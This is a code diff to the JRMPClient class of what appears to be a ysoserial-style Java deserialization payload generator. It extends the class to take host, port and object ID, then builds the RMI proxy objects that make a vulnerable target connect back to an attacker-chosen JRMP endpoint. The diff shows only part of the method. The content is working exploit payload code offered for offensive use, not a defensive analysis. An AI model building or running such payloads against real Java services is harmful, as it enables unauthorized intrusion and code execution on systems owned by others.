@@ -51,23 +51,32 @@ import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
     "restriction"
 } )
 @PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
-@Authors({ Authors.MBECHLER })
+@Authors({ Authors.MBECHLER,Authors.C0NY1 })
 public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {
 
     public Registry getObject ( final String command ) throws Exception {
-
         String host;
         int port;
-        int sep = command.indexOf(':');
-        if ( sep < 0 ) {
+        int objId;
+
+        String[] cmds = command.split("\\:");
+        if(cmds.length == 1){
+            host = cmds[0];
             port = new Random().nextInt(65535);
-            host = command;
+            objId = new Random().nextInt();
+        }else if(cmds.length == 2){
+            host = cmds[0];
+            port = Integer.valueOf(cmds[1]);
+            objId = new Random().nextInt();
+        }else if(cmds.length == 3){
+            host = cmds[0];
+            port = Integer.valueOf(cmds[1]);
+            objId = Integer.valueOf(cmds[2]);
+        }else{
+            throw new Exception("Usage: -a host:port:obj_id");
         }
-        else {
-            host = command.substring(0, sep);
-            port = Integer.valueOf(command.substring(sep + 1));
-        }
-        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+
+        ObjID id = new ObjID(objId); // RMI registry
         TCPEndpoint te = new TCPEndpoint(host, port);
         UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
         RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
